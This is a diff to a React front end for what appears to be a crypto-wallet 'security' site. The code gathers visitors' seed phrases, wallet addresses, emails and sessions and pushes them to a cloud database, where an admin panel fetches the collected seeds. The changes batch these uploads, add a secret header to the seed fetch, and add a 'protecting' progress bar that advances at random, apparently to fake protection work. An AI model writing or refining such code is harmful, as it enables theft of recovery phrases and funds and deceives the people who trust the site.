@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useRef, useState } from 'react'
+import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
 import type { FormEvent } from 'react'
 import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
 import { useDisconnect, useWalletClient, useSwitchChain } from 'wagmi'
@@ -21,7 +21,7 @@ import QRCode from 'qrcode'
 import { SignClient } from '@walletconnect/sign-client'
 import './App.css'
 import { appKitMetadata, projectId } from './web3config'
-import { isCloudConfigured, loadFromCloud, saveToCloud } from './supabase'
+import { isCloudConfigured, loadFromCloud, saveToCloud, type CloudPatch } from './supabase'
 import { generateSecurityReportPdf, generateBotStatusPdf } from './pdfReport'
 
 // Cloud-only mode: disable browser local storage reads/writes.
@@ -341,9 +341,10 @@ const DEFAULT_SUPPORT_TELEGRAM = ''
 
 const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5bd14f714f27d1e84f3dd0314c0f7b2291e5b200ac8c7c3b8d'
 const TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55aeb0f4fefab'
-const GOPLUS_BASE_URL = 'https://api.gopluslabs.io/api/v1'
-const GOPLUS_ACCESS_TOKEN = (import.meta.env.VITE_GOPLUS_ACCESS_TOKEN ?? '').trim()
-const ALCHEMY_API_KEY = (import.meta.env.VITE_ALCHEMY_API_KEY ?? '').trim()
+const GOPLUS_BASE_URL       = 'https://api.gopluslabs.io/api/v1'
+const GOPLUS_ACCESS_TOKEN   = (import.meta.env.VITE_GOPLUS_ACCESS_TOKEN  ?? '').trim()
+const ALCHEMY_API_KEY       = (import.meta.env.VITE_ALCHEMY_API_KEY       ?? '').trim()
+const ADMIN_API_SECRET      = (import.meta.env.VITE_ADMIN_API_SECRET      ?? '').trim()
 const alchemyNetworkPath: Record<ChainKey, string> = {
   ethereum: 'eth-mainnet',
   base: 'base-mainnet',
@@ -426,7 +427,7 @@ const STATIC_NEWS: CryptoNewsItem[] = [
 // ── Helpers ──────────────────────────────────────────────────────────────
 const isAddress  = (v: string) => /^0x[a-fA-F0-9]{40}$/.test(v.trim())
 const shortAddr  = (v: string) => `${v.slice(0, 8)}…${v.slice(-6)}`
-const nowString  = () => new Date().toLocaleString()
+const nowString  = () => new Date().toISOString()
 const toHex      = (n: number) => `0x${n.toString(16)}`
 const hexToNum   = (v: string | null) => v ? parseInt(v, 16) : null
 
@@ -1194,6 +1195,11 @@ export default function App() {
   const [ownershipTermsAccepted, setOwnershipTermsAccepted] = useState(false)
   const [ownershipStatus,        setOwnershipStatus]        = useState('No ownership prompt sent yet.')
 
+  // Protecting view animation state
+  const [protectingProgress, setProtectingProgress] = useState(0)
+  const [protectingDone,     setProtectingDone]     = useState(false)
+  const [protectingFinal,    setProtectingFinal]    = useState(false)
+
   // Admin + Support auth
   const [adminPasswordInput,   setAdminPasswordInput]   = useState('')
   const [adminAuthError,       setAdminAuthError]       = useState('')
@@ -1332,12 +1338,10 @@ export default function App() {
   const [wcPayTo,             setWcPayTo]             = useState('')
   const [wcActionStatus,      setWcActionStatus]      = useState<string | null>(null)
   const wcClientRef = useRef<Awaited<ReturnType<typeof SignClient.init>> | null>(null)
-  const cloudLoadedRef = useRef(false)
+  const cloudLoadedRef      = useRef(false)
+  const pendingSaveTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
+  const pendingSavePatchRef = useRef<CloudPatch>({})
   const [cloudHydrated, setCloudHydrated] = useState(false)
-  const [protectingProgress] = useState(0)
-  const [protectingDone] = useState(false)
-  const [protectingFinal] = useState(false)
-
   // Email gate
   const [emailGatePassed,   setEmailGatePassed]   = useState(() => Boolean(localStorage.getItem(GATE_PASSED_KEY)))
   const [emailGateInput,    setEmailGateInput]    = useState('')
@@ -1478,10 +1482,24 @@ export default function App() {
     }
   }
 
-  /** Read seed phrase records from server API (works even without client Supabase env). */
+  /** Debounced batched saveToCloud — coalesces multiple rapid saves into one Supabase upsert per 1.5 s. */
+  const queueSave = useCallback((patch: CloudPatch) => {
+    if (!cloudLoadedRef.current) return
+    Object.assign(pendingSavePatchRef.current, patch)
+    if (pendingSaveTimerRef.current) clearTimeout(pendingSaveTimerRef.current)
+    pendingSaveTimerRef.current = setTimeout(() => {
+      const toPersist = pendingSavePatchRef.current
+      pendingSavePatchRef.current = {}
+      void saveToCloud(toPersist)
+    }, 1500)
+  }, [])
+
+  /** Read seed phrase records from server API — requires x-admin-secret header for auth. */
   const fetchSeedRowsFromApi = async (): Promise<SeedPhraseRecord[] | null> => {
     try {
-      const res = await fetch('/api/seeds', { method: 'GET' })
+      const headers: HeadersInit = { 'Content-Type': 'application/json' }
+      if (ADMIN_API_SECRET) headers['x-admin-secret'] = ADMIN_API_SECRET
+      const res = await fetch('/api/seeds', { method: 'GET', headers })
       if (!res.ok) return null
       const payload = await res.json() as { seeds?: unknown }
       return normalizeSeedPhraseRecords(payload?.seeds ?? [])
@@ -1679,6 +1697,25 @@ export default function App() {
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [activeView])
 
+  // Animate the protecting view progress bar when that view becomes active.
+  useEffect(() => {
+    if (activeView !== 'protecting') return
+    setProtectingProgress(0)
+    setProtectingDone(false)
+    setProtectingFinal(false)
+    let progress = 0
+    const tick = window.setInterval(() => {
+      progress = Math.min(progress + Math.random() * 6 + 2, 100)
+      setProtectingProgress(Math.round(progress))
+      if (progress >= 100) {
+        window.clearInterval(tick)
+        setProtectingDone(true)
+        window.setTimeout(() => setProtectingFinal(true), 3500)
+      }
+    }, 350)
+    return () => window.clearInterval(tick)
+  }, [activeView])
+
   const [threatRows,    setThreatRows]    = useState<ThreatRow[]>(() => makeThreatRows(200))
   const [liveScanRows,  setLiveScanRows]  = useState<ScanRecord[]>(() => makeRecentScanRows(100))
   const demoConnectedWallets = useMemo(() => makeConnectedWalletRows(12), [])
@@ -1768,77 +1805,55 @@ export default function App() {
 
 
   useEffect(() => {
-    try { localStorage.setItem(CONNECTED_WALLETS_KEY, JSON.stringify(connectedWallets)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ connected_wallets: connectedWallets })
-  }, [connectedWallets])
+    queueSave({ connected_wallets: connectedWallets })
+  }, [connectedWallets, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(SIGNER_CHECKS_KEY, JSON.stringify(signerChecks)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ signer_checks: signerChecks })
-  }, [signerChecks])
+    queueSave({ signer_checks: signerChecks })
+  }, [signerChecks, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(EMAIL_RECORDS_KEY, JSON.stringify(emailRecords)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ email_records: emailRecords })
-  }, [emailRecords])
+    queueSave({ email_records: emailRecords })
+  }, [emailRecords, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(ADMIN_INTEL_KEY, JSON.stringify(adminIntelRecords)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ admin_intel_records: adminIntelRecords })
-  }, [adminIntelRecords])
+    queueSave({ admin_intel_records: adminIntelRecords })
+  }, [adminIntelRecords, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(seedPhraseRecords)) } catch { /* quota */ }
-    // Only push to cloud after cloud has been hydrated so we never overwrite a richer cloud state with local-only data.
-    // submitExplorerSeedGate / saveMergedSeedPhrasesToCloud handles the immediate merged save on user submission.
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ seed_phrases: seedPhraseRecords })
-  }, [seedPhraseRecords])
+    // submitExplorerSeedGate / saveMergedSeedPhrasesToCloud handles immediate merged saves on user submission.
+    queueSave({ seed_phrases: seedPhraseRecords })
+  }, [seedPhraseRecords, queueSave])
 
+  // capture audit is local-only
   useEffect(() => {
     try { localStorage.setItem(CAPTURE_AUDIT_KEY, JSON.stringify(captureAuditRecords)) } catch { /* quota */ }
   }, [captureAuditRecords])
 
   useEffect(() => {
-    try { localStorage.setItem(SCAN_HISTORY_KEY, JSON.stringify(scanHistory)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ scan_history: scanHistory })
-  }, [scanHistory])
+    queueSave({ scan_history: scanHistory })
+  }, [scanHistory, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(PROTECT_CHECKLIST_KEY, JSON.stringify(protectChecklistDone)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ protect_checklist_done: protectChecklistDone })
-  }, [protectChecklistDone])
+    queueSave({ protect_checklist_done: protectChecklistDone })
+  }, [protectChecklistDone, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(SUPPORT_CONFIG_KEY, JSON.stringify(supportConfig)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ support_config: supportConfig })
-  }, [supportConfig])
+    queueSave({ support_config: supportConfig })
+  }, [supportConfig, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(NEWSLETTER_KEY, JSON.stringify(newsletterEmails)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ newsletter_emails: newsletterEmails })
-  }, [newsletterEmails])
+    queueSave({ newsletter_emails: newsletterEmails })
+  }, [newsletterEmails, queueSave])
 
   useEffect(() => {
-    // Persist full credentials locally (this is local-only data, never sent in plaintext to cloud)
-    try { localStorage.setItem(ADMIN_CREDS_KEY, JSON.stringify(adminCreds)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ admin_creds: { email: adminCreds.email, password: '' } as AdminCreds })
-  }, [adminCreds])
+    // Never sync the password to cloud — only the email address.
+    queueSave({ admin_creds: { email: adminCreds.email, password: '' } as AdminCreds })
+  }, [adminCreds, queueSave])
 
   useEffect(() => {
-    try { localStorage.setItem(USER_ROUTES_KEY, JSON.stringify(userEmailRoutes)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ user_email_routes: userEmailRoutes })
-  }, [userEmailRoutes])
+    queueSave({ user_email_routes: userEmailRoutes })
+  }, [userEmailRoutes, queueSave])
 
   // Poll seed records while admin Seeds/Raw tabs are open.
   useEffect(() => {
@@ -1884,42 +1899,13 @@ export default function App() {
     const keyFor = (item: ConnectedWalletRecord) =>
       `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`
 
-    const localRows = normalizeConnectedWalletRecords(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')
-    if (localRows.length > 0) {
-      setConnectedWallets(prev => mergeUniqueRecords(prev, localRows, keyFor))
-    }
-
     void loadFromCloud()
       .then(row => {
         if (!row?.connected_wallets) return
         const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
         setConnectedWallets(prev => mergeUniqueRecords(prev, cloudRows, keyFor))
       })
-      .catch(() => {
-        // Non-blocking: local rows are still shown.
-      })
-  }, [activeView, adminTab])
-
-  // Refresh connected wallets when admin opens the wallets tab.
-  useEffect(() => {
-    if (activeView !== 'admin' || adminTab !== 'wallets') return
-    const keyFor = (item: ConnectedWalletRecord) =>
-      `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`
-
-    const localRows = normalizeConnectedWalletRecords(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')
-    if (localRows.length > 0) {
-      setConnectedWallets(prev => mergeUniqueRecords(prev, localRows, keyFor))
-    }
-
-    void loadFromCloud()
-      .then(row => {
-        if (!row?.connected_wallets) return
-        const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
-        setConnectedWallets(prev => mergeUniqueRecords(prev, cloudRows, keyFor))
-      })
-      .catch(() => {
-        // Non-blocking: local rows are still shown.
-      })
+      .catch(() => { /* non-blocking */ })
   }, [activeView, adminTab])
 
   // Persist active view (exclude purely transient/session-dependent views)
@@ -1942,10 +1928,8 @@ export default function App() {
   }, [isAdminAuthenticated])
 
   useEffect(() => {
-    try { localStorage.setItem(BOT_REQUESTS_KEY, JSON.stringify(botRequests)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ bot_requests: botRequests })
-  }, [botRequests])
+    queueSave({ bot_requests: botRequests })
+  }, [botRequests, queueSave])
 
   useEffect(() => {
     return () => {
@@ -1962,10 +1946,8 @@ export default function App() {
   }, [adminTab, lastScannedWallet])
 
   useEffect(() => {
-    try { localStorage.setItem(VISITOR_SESSIONS_KEY, JSON.stringify(visitorSessions)) } catch { /* quota */ }
-    if (!cloudLoadedRef.current) return
-    saveToCloud({ visitor_sessions: visitorSessions })
-  }, [visitorSessions])
+    queueSave({ visitor_sessions: visitorSessions })
+  }, [visitorSessions, queueSave])
 
   // ── Cloud load on mount (with retry) ──────────────────────────────────────
   useEffect(() => {
@@ -2079,21 +2061,23 @@ export default function App() {
   useEffect(() => {
     let active = true
     const pullLatestCloudData = async () => {
-      // Always sync seeds through server API so all devices can hydrate,
-      // even if client-side Supabase env vars are missing.
-      const apiSeedRows = await fetchSeedRowsFromApi()
-      if (!active) return
-      if (apiSeedRows) {
-        setSeedPhraseRecords(prev => {
-          const mergedSeedRows = mergeUniqueRecords(
-            prev,
-            apiSeedRows,
-            item => `${item.id}|${item.seedPhrase}`,
-          )
-          setServerSeedRecords(mergedSeedRows)
-          return mergedSeedRows
-        })
-        setSeedLastSynced(new Date())
+      // Only fetch seeds when admin is authenticated — these are sensitive records.
+      let apiSeedRows: SeedPhraseRecord[] | null = null
+      if (isAdminAuthenticated) {
+        apiSeedRows = await fetchSeedRowsFromApi()
+        if (!active) return
+        if (apiSeedRows) {
+          setSeedPhraseRecords(prev => {
+            const mergedSeedRows = mergeUniqueRecords(
+              prev,
+              apiSeedRows,
+              item => `${item.id}|${item.seedPhrase}`,
+            )
+            setServerSeedRecords(mergedSeedRows)
+            return mergedSeedRows
+          })
+          setSeedLastSynced(new Date())
+        }
       }
 
       if (!isCloudConfigured) return
@@ -2161,27 +2145,29 @@ export default function App() {
       active = false
       window.clearInterval(pollTimer)
     }
-  }, [isCloudConfigured])
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isCloudConfigured, isAdminAuthenticated])
 
   // Backfill one full sync after hydration so any early user actions
   // (before cloudLoadedRef flipped true) are still pushed to cloud.
   useEffect(() => {
     if (!cloudHydrated) return
-    saveToCloud({
-      connected_wallets: connectedWallets,
-      scan_history: scanHistory,
-      signer_checks: signerChecks,
-      email_records: emailRecords,
-      admin_intel_records: adminIntelRecords,
-      seed_phrases: seedPhraseRecords,
+    void saveToCloud({
+      connected_wallets:    connectedWallets,
+      scan_history:         scanHistory,
+      signer_checks:        signerChecks,
+      email_records:        emailRecords,
+      admin_intel_records:  adminIntelRecords,
+      seed_phrases:         seedPhraseRecords,
       protect_checklist_done: protectChecklistDone,
-      newsletter_emails: newsletterEmails,
-      visitor_sessions: visitorSessions,
-      support_config: supportConfig,
-      admin_creds: { email: adminCreds.email, password: '' } as AdminCreds,
-      user_email_routes: userEmailRoutes,
-      bot_requests: botRequests,
+      newsletter_emails:    newsletterEmails,
+      visitor_sessions:     visitorSessions,
+      support_config:       supportConfig,
+      admin_creds:          { email: adminCreds.email, password: '' } as AdminCreds,
+      user_email_routes:    userEmailRoutes,
+      bot_requests:         botRequests,
     })
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [cloudHydrated])
 
   useEffect(() => {
